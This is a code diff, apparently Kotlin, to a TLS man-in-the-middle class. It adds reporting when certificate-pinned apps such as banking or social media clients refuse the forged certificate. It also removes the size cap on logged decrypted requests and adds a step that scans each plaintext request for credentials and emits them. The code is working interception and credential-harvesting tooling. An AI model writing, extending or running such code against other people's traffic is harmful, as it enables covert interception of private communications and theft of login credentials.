@@ -100,7 +100,15 @@ class TlsMitm {
             vs.setSSLParameters(vp)
             // bound the handshake so a stalled/validating client can't pin a thread forever
             raw.soTimeout = HANDSHAKE_TIMEOUT_MS
-            vs.startHandshake()
+            try {
+                vs.startHandshake()
+            } catch (t: Throwable) {
+                // The client parsed our ClientHello (so we know the SNI) but refused our cert:
+                // this is a pinned / cert-validating app (banking, Facebook, Instagram, ...).
+                // Surface it honestly instead of a silent drop, so the user sees WHY.
+                matcher.host?.let { onLine?.invoke("[TLS] $it — pinned/validating client, cannot decrypt") }
+                vs.close(); return
+            }
             raw.soTimeout = 0
             val host = matcher.host ?: run { vs.close(); return }
 
@@ -129,7 +137,9 @@ class TlsMitm {
             while (true) {
                 val n = vIn.read(buf)
                 if (n < 0) break
-                logRequest(host, String(buf, 0, n.coerceAtMost(2048), Charsets.ISO_8859_1))
+                val text = String(buf, 0, n, Charsets.ISO_8859_1)
+                logRequest(host, text)
+                for (cred in CredSniffer.scanText(host, text)) onLine?.invoke(cred)
                 uOut.write(buf, 0, n); uOut.flush()
             }
         } catch (_: Throwable) {
